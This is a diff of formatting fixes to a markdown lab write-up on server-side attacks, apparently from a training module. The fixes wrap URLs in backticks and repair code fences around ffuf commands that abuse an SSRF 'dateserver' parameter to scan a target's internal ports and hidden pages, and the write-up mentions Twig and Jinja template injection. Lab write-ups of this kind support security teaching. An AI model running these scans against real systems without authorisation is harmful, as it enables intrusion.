@@ -79,7 +79,7 @@ In this module, we conduct an in-depth technical analysis of server-side attack 
 #### Technical Methodology & Exploit Execution:
 
 First lets enter to the website hosted by the target machine:
-http://<target-IP>
+`http://<target-IP>`
 
 
 There is a check-availability functionality, lets inspect the generated HTTP
@@ -103,7 +103,7 @@ We can modify the 'dateserver' such that it can access internal (localhost)
 resources within the webserver.
 
 Let's confirm that by sending a request to
-http://127.0.0.1
+`http://127.0.0.1`
 with burpsuite repeater:
 
 We can observe that accessing the localhost brought us the web pages,
@@ -126,10 +126,10 @@ seq 1 10000 > ports.txt
 and now lets run the fuff bruteforce for the ports:
 ```bash
 ffuf -w ./ports.txt -u http://<target-IP>/index.php -X POST
-```
 -H "Content-Type: application/x-www-form-urlencoded" -d
 "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr
 "Failed to connect to" -s
+```
 *note – the failing message is generated when attempting to enter arbitrary
 port – here is an example for port 44444:
 
@@ -166,12 +166,11 @@ which haas to be run as dataserver parameter to the web server – using SSRF
 (we send the request to the web server, such that the web server will brute
 force for extra pages in 'dataserver.htb):
 ```bash
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-
-```
-small-words.txt -u http://<target-IP>/index.php -X POST -H
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://<target-IP>/index.php -X POST -H
 "Content-Type: application/x-www-form-urlencoded" -d
 "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01"
 -fr "Server at dateserver.htb Port 80"
+```
 
 
 There is another page – called 'admin'
@@ -204,10 +203,10 @@ messaging of 'Something went wrong!', given when attempting to use SSRF on
 arbitrary port:
 ```bash
 ffuf -w ./ports.txt -u http://10.129.158.183/index.php -X
-```
 POST -H "Content-Type: application/x-www-form-urlencoded" -d
 "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr
 "Something went wrong!" -s
+```
 
 
 And we get the port 5000 is also locally active on the target machine.
@@ -227,7 +226,7 @@ And we get the port 5000 is also locally active on the target machine.
 #### Technical Methodology & Exploit Execution:
 
 First lets enter to the target server website:
-http://<Target-IP>:<target-port>
+`http://<Target-IP>:<target-port>`
 
 
 And we get to this page where the user can enter his name.
@@ -294,7 +293,7 @@ As the output is 49 – it's Twig.
 #### Technical Methodology & Exploit Execution:
 
 Lets enter the website in the target server:
-http://<Target-IP>:<target-port>
+`http://<Target-IP>:<target-port>`
 
 
 and exploit Jinja SSTI ('Server-side Template Injection') to obtain RCE to get the
@@ -378,7 +377,7 @@ payload:
 #### Technical Methodology & Exploit Execution:
 
 in here – upon entering the website:
-http://<Target-IP>:<target-port>
+`http://<Target-IP>:<target-port>`
 we get to a new site:
 
 And in the bottom of the page there is an input field:
